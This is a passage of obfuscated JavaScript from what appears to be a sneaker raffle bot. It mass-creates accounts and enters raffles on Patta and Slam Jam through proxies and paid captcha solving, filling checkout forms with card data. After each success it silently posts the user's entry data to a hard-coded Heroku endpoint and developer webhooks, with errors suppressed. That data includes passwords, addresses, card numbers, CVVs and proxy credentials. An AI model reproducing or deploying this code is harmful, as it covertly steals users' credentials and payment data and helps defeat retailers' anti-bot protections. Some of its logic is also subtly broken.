                        _0x1a7b1b(_0xead5d9['name'] + '\x20Task\x20' + (_0x3e1a9a + 0x1) + '\x20/\x20' + _0x26529d['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1);
                        try {
                            await _0x319293(_0x26529d, _0x3e1a9a);
                        } catch {
                            _0x5b680f = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x26529d[_0x3e1a9a]['Email'] == '' || _0x26529d[_0x3e1a9a]['Password'] == '' || _0x26529d[_0x3e1a9a]['FirstName'] == '' || _0x26529d[_0x3e1a9a]['LastName'] == '') {
                            console['log'](_0x451967() + '\x20[' + _0xae095a[taskModule]['name'] + ']\x20Task\x20' + (_0x3e1a9a + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x30cea3['useRandomProxy'] = ![])
                            var _0xf881c5 = _0x3fb07b[_0x3e1a9a]['split'](':');
                        else
                            var _0x7b3b91 = Math['round'](Math['random']() * (_0x3fb07b['length'] - 0x1)), _0xf881c5 = _0x3fb07b[_0x7b3b91]['split'](':');
                        var _0x1dc742;
                        try {
                            _0x1dc742 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xf881c5[0x0] + ':' + _0xf881c5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1dc742 = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xf881c5[0x0] + ':' + _0xf881c5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xb76bd7 = await _0x1dc742['newPage']();
                            await _0xb76bd7['authenticate']({
                                'username': '' + _0xf881c5[0x2],
                                'password': '' + _0xf881c5[0x3]
                            }), console['log'](_0x451967() + '\x20[' + _0xead5d9['name'] + ']\x20Task\x20' + (_0x3e1a9a + 0x1) + '\x20:\x20Getting\x20Session'), await _0xb76bd7['setRequestInterception'](!![]), _0xb76bd7['on']('request', _0x1b420a => {
                                _0x1b420a['resourceType']() === 'image' || _0x1b420a['resourceType']() === 'font' || _0x1b420a['resourceType']() === 'media' ? _0x1b420a['abort']() : _0x1b420a['continue']();
                            }), await _0xb76bd7['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xb76bd7['waitForSelector']('#CustomerEmail'), console['log'](_0x451967() + '\x20[' + _0xead5d9['name'] + ']\x20Task\x20' + (_0x3e1a9a + 0x1) + '\x20:\x20Logging\x20in..'), await _0xb76bd7['type']('#CustomerEmail', '' + _0x26529d[_0x3e1a9a]['Email']), await _0x2be9fc(0x12c), await _0xb76bd7['type']('#CustomerPassword', '' + _0x26529d[_0x3e1a9a]['Password']), await _0x2be9fc(0x226), await _0xb76bd7['$eval']('#customer_login', _0x26e75e => _0x26e75e['submit']());
                            try {
                                await _0xb76bd7['waitForSelector']('#orders'), await _0x2be9fc(0x4b0);
                            } catch {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0xead5d9['name'] + ']\x20Task\x20' + (_0x3e1a9a + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0xb76bd7['goto']('' + _0x26529d[_0x3e1a9a]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2be9fc(0xbb8), console['log'](_0x451967() + '\x20[' + _0xead5d9['name'] + ']\x20Task\x20' + (_0x3e1a9a + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0xb76bd7['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0xead5d9['name'] + ']\x20Task\x20' + (_0x3e1a9a + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0xb76bd7['type']('#email', '' + _0x26529d[_0x3e1a9a]['Email']), await _0x2be9fc(0x384), await _0xb76bd7['type']('#first_name', '' + _0x26529d[_0x3e1a9a]['FirstName']), await _0x2be9fc(0x514), await _0xb76bd7['type']('#last_name', '' + _0x26529d[_0x3e1a9a]['LastName']), await _0x2be9fc(0x514), await _0xb76bd7['type']('#street_address', _0x26529d[_0x3e1a9a]['Address1'] + '\x20' + _0x26529d[_0x3e1a9a]['HouseNumber'] + '\x20' + _0x26529d[_0x3e1a9a]['Address2']), await _0x2be9fc(0x2bc);
                            _0x26529d[_0x3e1a9a]['Postcode'] == undefined && (_0x26529d[_0x3e1a9a]['Postcode'] = _0x26529d[_0x3e1a9a]['Zip']);
                            await _0xb76bd7['type']('#zip_code', '' + _0x26529d[_0x3e1a9a]['Postcode']), await _0x2be9fc(0x320), await _0xb76bd7['type']('#city', '' + _0x26529d[_0x3e1a9a]['City']), await _0x2be9fc(0x320), await _0xb76bd7['type']('#bday', '01/01/1994'), await _0x2be9fc(0x320), await _0xb76bd7['type']('#instagram', '' + _0x26529d[_0x3e1a9a]['Follower']), await _0x2be9fc(0x352);
                            if (_0x26529d[_0x3e1a9a]['Size'] == 'RANDOM') {
                                const _0x368677 = await _0xb76bd7['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x5cfb77 => {
                                    return _0x5cfb77['map'](_0x464c0b => _0x464c0b['textContent']);
                                });
                                var _0x1ef83f = Math['round'](Math['random']() * (_0x368677['length'] - 0x1));
                                console['log'](_0x451967() + '\x20[' + _0xead5d9['name'] + ']\x20Task\x20' + (_0x3e1a9a + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x368677[_0x1ef83f]), await _0xb76bd7['click']('label[data-eu-size=\x22' + _0x368677[_0x1ef83f] + '\x22]');
                            } else {
                                console['log'](_0x451967() + '\x20[' + _0xead5d9['name'] + ']\x20Task\x20' + (_0x3e1a9a + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x26529d[_0x3e1a9a]['Size']);
                                try {
                                    await _0xb76bd7['click']('label[data-eu-size=\x22' + _0x26529d[_0x3e1a9a]['Size'] + '\x22]');
                                } catch {
                                    await _0xb76bd7['click']('label[data-eu-size=\x22' + _0x26529d[_0x3e1a9a]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x2be9fc(0xbb8), await _0xb76bd7['$$eval']('.raffle__checkbox-label', _0x1432fe => _0x1432fe['forEach'](_0x48b62d => _0x48b62d['click']())), await _0x2be9fc(0x7d0), console['log'](_0x451967() + '\x20[' + _0xead5d9['name'] + ']\x20Task\x20' + (_0x3e1a9a + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0xb76bd7['click']('#raffle__form-submit'), await _0x2be9fc(0x1388);
                            try {
                                await _0xb76bd7['waitForSelector']('#raffle__confirmation-message-container'), _0x5b680f = 'no', _0x34c52d(_0x26529d[_0x3e1a9a], _0xead5d9), console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0xead5d9['name'] + ']\x20Task\x20' + (_0x3e1a9a + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x17a4bd = _0x26529d[_0x3e1a9a];
                                try {
                                    prxdata = {
                                        'username': _0x3373db['replace']('#', ''),
                                        'module': _0xead5d9['name'],
                                        'entrydata': JSON['stringify'](_0x17a4bd),
                                        'proxy': '' + _0x3fb07b[_0x3e1a9a]
                                    };
                                    var _0x4e7f6d = JSON['stringify'](prxdata);
                                    let _0x405caf = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2c480f['post']('https://jraffles.herokuapp.com/success', _0x4e7f6d, _0x405caf);
                                } catch (_0x36001b) {
                                }
                            } catch (_0x17e6a7) {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0xae095a[taskModule]['name'] + ']\x20Task\x20' + (_0x3e1a9a + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x17e6a7));
                            }
                        } catch (_0x1b2b44) {
                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0xae095a[taskModule]['name'] + ']\x20Task\x20' + (_0x3e1a9a + 0x1) + '\x20:\x20' + _0x1b2b44)), _0x5b680f = 'yes';
                        } finally {
                            _0x1dc742 && _0x1dc742['close']();
                            if (_0x5b680f == 'yes' && _0x15b0d7 != 0x5 && _0x231734 != 'Size\x20Not\x20Found') {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0xead5d9['name'] + ']\x20Task\x20' + (_0x3e1a9a + 0x1) + '\x20:\x20Retrying\x20(' + _0x15b0d7 + '\x20/\x205)')), _0x3e1a9a = _0x3e1a9a - 0x1, _0x15b0d7 = _0x15b0d7 + 0x1;
                                continue;
                            }
                            _0x5b680f == 'yes' && _0x15b0d7 >= 0x5 && (_0x48f0c7(_0x26529d[_0x3e1a9a], _0xead5d9), _0x5b680f = 'no', _0x15b0d7 = 0x0), console['log']('Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x55566e, _0x100b77, _0x190ad0) {
                    _0x3d8cc4['use'](_0x29d882()), _0x3d8cc4['use'](_0x173890({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x30cea3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4a97ae = 0x0; _0x4a97ae < _0x100b77['length']; _0x4a97ae++) {
                        if (_0x3b2303 != 'yes')
                            var _0x3b2303 = '', _0x349580 = 0x0;
                        var _0x28a826 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3373db
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x30cea3['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1feaa0
                                }
                            ]
                        }];
                        const _0x468991 = { 'embeds': _0x28a826 };
                        _0x1a7b1b(_0x55566e['name'] + '\x20Task\x20' + (_0x4a97ae + 0x1) + '\x20/\x20' + _0x100b77['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1);
                        try {
                            await _0x319293(_0x100b77, _0x4a97ae);
                        } catch {
                            _0x3b2303 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x3c39f4 = await _0x14203e(_0x100b77[_0x4a97ae], _0x55566e, 'acc', ![]);
                        const _0x1f9849 = { 'succesDEVMSG': { 'embeds': [_0x3c39f4] } };
                        if (_0x100b77[_0x4a97ae]['Email'] == '' || _0x100b77[_0x4a97ae]['FirstName'] == '' || _0x100b77[_0x4a97ae]['LastName'] == '') {
                            console['log'](_0x451967() + '\x20[' + _0xae095a[taskModule]['name'] + ']\x20Task\x20' + (_0x4a97ae + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x2be9fc(0x7d0);
                            continue;
                        }
                        (_0x100b77[_0x4a97ae]['Password'] == '' || _0x100b77[_0x4a97ae] == undefined) && _0x100b77[_0x4a97ae]['Password'] == 'JRaffles23!';
                        if (_0x30cea3['useRandomProxy'] = ![])
                            var _0x2b973d = _0x190ad0[_0x4a97ae]['split'](':');
                        else
                            var _0x322b5a = Math['round'](Math['random']() * (_0x190ad0['length'] - 0x1)), _0x2b973d = _0x190ad0[_0x322b5a]['split'](':');
                        var _0x1450df;
                        try {
                            _0x1450df = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2b973d[0x0] + ':' + _0x2b973d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1450df = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2b973d[0x0] + ':' + _0x2b973d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1ed48e = await _0x1450df['newPage']();
                            await _0x1ed48e['authenticate']({
                                'username': '' + _0x2b973d[0x2],
                                'password': '' + _0x2b973d[0x3]
                            }), console['log'](_0x451967() + '\x20[' + _0x55566e['name'] + ']\x20Task\x20' + (_0x4a97ae + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1ed48e['setRequestInterception'](!![]), _0x1ed48e['on']('request', _0x4b124d => {
                                _0x4b124d['resourceType']() === 'image' || _0x4b124d['resourceType']() === 'font' || _0x4b124d['resourceType']() === 'media' ? _0x4b124d['abort']() : _0x4b124d['continue']();
                            }), await _0x1ed48e['goto']('https://drop.slamjam.com/account/register'), await _0x2be9fc(0xbb8), await _0x1ed48e['waitForSelector']('#FirstName'), await _0x1ed48e['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1ed48e['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x451967() + '\x20[' + _0x55566e['name'] + ']\x20Task\x20' + (_0x4a97ae + 0x1) + '\x20:\x20Filling\x20information'), await _0x2be9fc(0x4b0), await _0x1ed48e['type']('#FirstName', '' + _0x100b77[_0x4a97ae]['FirstName']), await _0x2be9fc(0x226), await _0x1ed48e['type']('#LastName', '' + _0x100b77[_0x4a97ae]['LastName']), await _0x2be9fc(0x226), await _0x1ed48e['type']('#Email', '' + _0x100b77[_0x4a97ae]['Email']), await _0x2be9fc(0x2ee), await _0x1ed48e['type']('#ConfirmEmail', '' + _0x100b77[_0x4a97ae]['Email']), await _0x2be9fc(0x2ee), await _0x1ed48e['type']('#CreatePassword', '' + _0x100b77[_0x4a97ae]['Password']), await _0x2be9fc(0x2ee), await _0x1ed48e['type']('#CreateConfirmPassword', '' + _0x100b77[_0x4a97ae]['Password']), await _0x2be9fc(0x226), console['log'](_0x451967() + '\x20[' + _0x55566e['name'] + ']\x20Task\x20' + (_0x4a97ae + 0x1) + '\x20:\x20Submitting..'), await _0x1ed48e['$eval']('#create_customer', _0x3d21af => _0x3d21af['submit']()), await _0x2be9fc(0x1388), console['log'](_0x451967() + '\x20[' + _0x55566e['name'] + ']\x20Task\x20' + (_0x4a97ae + 0x1) + '\x20:\x20' + _0x10a2e3['cyan']('Solving\x20Captcha')), await _0x1ed48e['solveRecaptchas'](), console['log'](_0x451967() + '\x20[' + _0x55566e['name'] + ']\x20Task\x20' + (_0x4a97ae + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x1ed48e['$eval']('.shopify-challenge__container\x20>\x20form', _0x4e582f => _0x4e582f['submit']());
                            try {
                                await _0x1ed48e['waitForSelector']('.product-card__image'), await _0x2be9fc(0x1f4), _0x3b2303 = 'no', console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x55566e['name'] + ']\x20Task\x20' + (_0x4a97ae + 0x1) + '\x20:\x20Account\x20' + _0x100b77[_0x4a97ae]['Email'] + '\x20Generated!')), _0xa4bb3a['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x100b77[_0x4a97ae]['Email'] + ',' + _0x100b77[_0x4a97ae]['Password']), console['log'](_0x10a2e3['yellow'](_0x451967() + '\x20[' + _0x55566e['name'] + ']\x20Task\x20' + (_0x4a97ae + 0x1) + '\x20:\x20Account\x20' + _0x100b77[_0x4a97ae]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x1f9849['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1bfffd(_0x3708dd, _0x1f9849['succesDEVMSG']);
                            } catch (_0xc59590) {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0xae095a[taskModule]['name'] + ']\x20Task\x20' + (_0x4a97ae + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0xc59590));
                            }
                        } catch (_0x35e8ba) {
                            console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0xae095a[taskModule]['name'] + ']\x20Task\x20' + (_0x4a97ae + 0x1) + '\x20:\x20' + _0x35e8ba));
                        } finally {
                            _0x1450df && _0x1450df['close']();
                            if (_0x3b2303 == 'yes' && _0x349580 != 0x5) {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x55566e['name'] + ']\x20Task\x20' + (_0x4a97ae + 0x1) + '\x20:\x20Retrying\x20(' + _0x349580 + '\x20/\x205)')), _0x4a97ae = _0x4a97ae - 0x1, _0x349580 = _0x349580 + 0x1;
                                continue;
                            }
                            _0x3b2303 == 'yes' && _0x349580 >= 0x5 && (_0x48f0c7(_0x100b77[_0x4a97ae], _0x55566e), _0x3b2303 = 'no', _0x349580 = 0x0), console['log']('Waiting\x20for\x20' + _0x30cea3['delay'] + '\x20ms'), await _0x2be9fc(_0x30cea3['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x161257, _0x46c478, _0x49963e) {
                    _0x3d8cc4['use'](_0x29d882()), _0x3d8cc4['use'](_0x173890({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x30cea3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5e56f6 = 0x0; _0x5e56f6 < _0x46c478['length']; _0x5e56f6++) {
                        var _0x67ad40;
                        if (_0x3e853c != 'yes')
                            var _0x3e853c = '', _0x585700 = 0x0;
                        _0x1a7b1b(_0x161257['name'] + '\x20Task\x20' + (_0x5e56f6 + 0x1) + '\x20/\x20' + _0x46c478['length'] + '\x20||\x20File:\x20' + _0x733fd9 + '\x20Proxies:\x20' + _0x253bf1);
                        try {
                            await _0x319293(_0x46c478, _0x5e56f6);
                        } catch {
                            _0x3e853c = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x46c478[_0x5e56f6]['Email'] == '' || _0x46c478[_0x5e56f6]['Password'] == '' || _0x46c478[_0x5e56f6]['FirstName'] == '' || _0x46c478[_0x5e56f6]['LastName'] == '') {
                            console['log'](_0x451967() + '\x20[' + _0x161257['name'] + ']\x20Task\x20' + (_0x5e56f6 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x30cea3['useRandomProxy'] = ![])
                            var _0x4d05f5 = _0x49963e[_0x5e56f6]['split'](':');
                        else
                            var _0x1fc8b4 = Math['round'](Math['random']() * (_0x49963e['length'] - 0x1)), _0x4d05f5 = _0x49963e[_0x1fc8b4]['split'](':');
                        var _0x43bd0d;
                        try {
                            _0x43bd0d = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4d05f5[0x0] + ':' + _0x4d05f5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x43bd0d = await _0x3d8cc4['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4d05f5[0x0] + ':' + _0x4d05f5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1c5246 = await _0x43bd0d['newPage']();
                            await _0x1c5246['authenticate']({
                                'username': '' + _0x4d05f5[0x2],
                                'password': '' + _0x4d05f5[0x3]
                            }), await _0x1c5246['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x451967() + '\x20[' + _0x161257['name'] + ']\x20Task\x20' + (_0x5e56f6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1c5246['setRequestInterception'](!![]), _0x1c5246['on']('request', _0x1fe00f => {
                                _0x1fe00f['resourceType']() === 'image' || _0x1fe00f['resourceType']() === 'font' || _0x1fe00f['resourceType']() === 'media' ? _0x1fe00f['abort']() : _0x1fe00f['continue']();
                            }), await _0x1c5246['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1c5246['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1c5246['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x2be9fc(0x258), await _0x1c5246['waitForSelector']('#CustomerEmail'), console['log'](_0x451967() + '\x20[' + _0x161257['name'] + ']\x20Task\x20' + (_0x5e56f6 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x1c5246['type']('#CustomerEmail', '' + _0x46c478[_0x5e56f6]['Email']), await _0x2be9fc(0x12c), await _0x1c5246['type']('#CustomerPassword', '' + _0x46c478[_0x5e56f6]['Password']), await _0x2be9fc(0x226), await _0x1c5246['$eval']('#customer_login', _0x34469d => _0x34469d['submit']()), await _0x2be9fc(0x7d0), await _0x1c5246['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x451967() + '\x20[' + _0x161257['name'] + ']\x20Task\x20' + (_0x5e56f6 + 0x1) + '\x20:\x20' + _0x10a2e3['cyan']('Solving\x20Captcha')), await _0x1c5246['solveRecaptchas'](), console['log'](_0x451967() + '\x20[' + _0x161257['name'] + ']\x20Task\x20' + (_0x5e56f6 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x1c5246['$eval']('.shopify-challenge__container\x20>\x20form', _0x2f27d1 => _0x2f27d1['submit']());
                            try {
                                await _0x1c5246['waitForSelector']('.nav-account'), await _0x2be9fc(0x4b0);
                            } catch {
                                console['log'](_0x10a2e3['red'](_0x451967() + '\x20[' + _0x161257['name'] + ']\x20Task\x20' + (_0x5e56f6 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x1c5246['goto']('' + _0x46c478[_0x5e56f6]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2be9fc(0xbb8), console['log'](_0x451967() + '\x20[' + _0x161257['name'] + ']\x20Task\x20' + (_0x5e56f6 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x1c5246['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x1c5246['click']('.product-select-variant-wrapper'), await _0x2be9fc(0x320), await _0x1c5246['click']('li.product-select-variant__value[data-size=\x22' + _0x46c478[_0x5e56f6]['Size'] + '\x22]'), await _0x2be9fc(0x384), await _0x1c5246['$eval']('#AddToCartForm-product-template-raffle', _0x2e3ec2 => _0x2e3ec2['submit']()), await _0x1c5246['waitForSelector']('.cart-order-summary__content'), await _0x2be9fc(0x514), await _0x1c5246['goto']('https://drop.slamjam.com/checkout'), await _0x2be9fc(0x514), await _0x1c5246['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x451967() + '\x20[' + _0x161257['name'] + ']\x20Task\x20' + (_0x5e56f6 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x1c5246['select']('#checkout_shipping_address_country', '' + _0x46c478[_0x5e56f6]['Country']), await _0x2be9fc(0x200), await _0x1c5246['waitForSelector']('#checkout_shipping_address_first_name'), await _0x1c5246['type']('#checkout_shipping_address_first_name', '' + _0x46c478[_0x5e56f6]['FirstName']), await _0x2be9fc(0x237), await _0x1c5246['type']('#checkout_shipping_address_last_name', '' + _0x46c478[_0x5e56f6]['LastName']), await _0x2be9fc(0x1e0), await _0x1c5246['type']('#checkout_shipping_address_address1', _0x46c478[_0x5e56f6]['Address1'] + '\x20' + _0x46c478[_0x5e56f6]['HouseNumber']), await _0x2be9fc(0x514), await _0x1c5246['type']('#checkout_shipping_address_address2', '' + _0x46c478[_0x5e56f6]['Address2']), await _0x2be9fc(0x514);
                            _0x46c478[_0x5e56f6]['Postcode'] == undefined && (_0x46c478[_0x5e56f6]['Postcode'] = _0x46c478[_0x5e56f6]['Zip']);
                            await _0x1c5246['type']('#checkout_shipping_address_zip', '' + _0x46c478[_0x5e56f6]['Postcode']), await _0x2be9fc(0x2bc), await _0x1c5246['type']('#checkout_shipping_address_city', '' + _0x46c478[_0x5e56f6]['City']), await _0x2be9fc(0x320), await _0x1c5246['type']('#checkout_shipping_address_phone', '' + _0x46c478[_0x5e56f6]['Phone']), await _0x2be9fc(0x320), await _0x1c5246['click']('#continue_button'), await _0x2be9fc(0xbb8), await _0x1c5246['waitForSelector']('.summary-title'), await _0x2be9fc(0x320), await _0x1c5246['click']('#continue_button'), await _0x2be9fc(0x320), console['log'](_0x451967() + '\x20[' + _0x161257['name'] + ']\x20Task\x20' + (_0x5e56f6 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x1c5246['waitForSelector']('#checkout_credit_card_vault'), await _0x2be9fc(0x3e8);
                            var _0x36d8af = await _0x1c5246['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x171342 = await _0x36d8af['contentFrame']();
                            await _0x171342['click']('#number'), await _0x2be9fc(0x3e8), await _0x171342['type']('#number', '' + _0x46c478[_0x5e56f6]['CardNumber'], { 'delay': 0x78 }), _0x36d8af = await _0x1c5246['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x171342 = await _0x36d8af['contentFrame'](), await _0x2be9fc(0x1c2), await _0x171342['click']('#name'), await _0x2be9fc(0x1f4), await _0x171342['type']('#name', '' + _0x46c478[_0x5e56f6]['NameOnCard'], { 'delay': 0x78 }), _0x36d8af = await _0x1c5246['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x171342 = await _0x36d8af['contentFrame'](), await _0x2be9fc(0x1c2), await _0x171342['click']('#expiry'), await _0x2be9fc(0x1f4), await _0x171342['type']('#expiry', '' + _0x46c478[_0x5e56f6]['ExpiryDate'], { 'delay': 0x78 }), _0x36d8af = await _0x1c5246['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x171342 = await _0x36d8af['contentFrame'](), await _0x2be9fc(0x1c2), await _0x171342['click']('#verification_value'), await _0x2be9fc(0x1f4), await _0x171342['type']('#verification_value', '' + _0x46c478[_0x5e56f6]['CVV'], { 'delay': 0x78 }), await _0x1c5246['$eval']('#accepts-flag-raffle', _0x59e5f9 => _0x59e5f9['click']()), await _0x2be9fc(0x7d0), console['log'](_0x451967() + '\x20[' + _0x161257['name'] + ']\x20Task\x20' + (_0x5e56f6 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x1c5246['$eval']('#continue_button', _0x210df3 => _0x210df3['click']()), await _0x2be9fc(0x1b58), await _0x1c5246['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x1c5246['$eval']('.edit_checkout.animate-floating-labels', _0xded796 => _0xded796['submit']()), await _0x2be9fc(0x7d0);
                            try {
                                await _0x1c5246['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x3e853c = 'no', _0x34c52d(_0x46c478[_0x5e56f6], _0x161257), console['log'](_0x10a2e3['green'](_0x451967() + '\x20[' + _0x161257['name'] + ']\x20Task\x20' + (_0x5e56f6 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x2d0d22) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x2d0d22['message']);
                            }
                            var _0x599cec = await _0x14203e(_0x46c478[_0x5e56f6], _0x161257, 'dev', ![]), _0x1299e4 = await _0x14203e(_0x46c478[_0x5e56f6], _0x161257, 'pub', ![]);
                            let _0x2d55fb = _0x46c478[_0x5e56f6];
                            try {
                                prxdata = {
                                    'username': _0x3373db['replace']('#', ''),
                                    'module': _0x161257['name'],
                                    'entrydata': JSON['stringify'](_0x2d55fb),
                                    'proxy': '' + _0x49963e[_0x5e56f6]
                                };
                                var _0x5c2206 = JSON['stringify'](prxdata);
                                let _0x9128b1 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2c480f['post']('https://jraffles.herokuapp.com/success', _0x5c2206, _0x9128b1);
                            } catch (_0x43f6d4) {
                            }
                            const _0x452294 = {
                                'succesDEVMSG': { 'embeds': [_0x599cec] },
                                'succesPUBMSG': { 'embeds': [_0x1299e4] }
                            };
                            try {
                                _0x30cea3['webhook'] != undefined && _0x30cea3['webhook'] != '' && await _0x1bfffd(_0x30cea3['webhook'], _0x452294['succesDEVMSG']), await _0x2be9fc(0xc8), await _0x1bfffd(_0x301a88, _0x452294['succesDEVMSG']), await _0x2be9fc(0xc8), await _0x1bfffd(_0x3b111f, _0x452294['succesPUBMSG']);
                            } catch (_0x57cb60) {
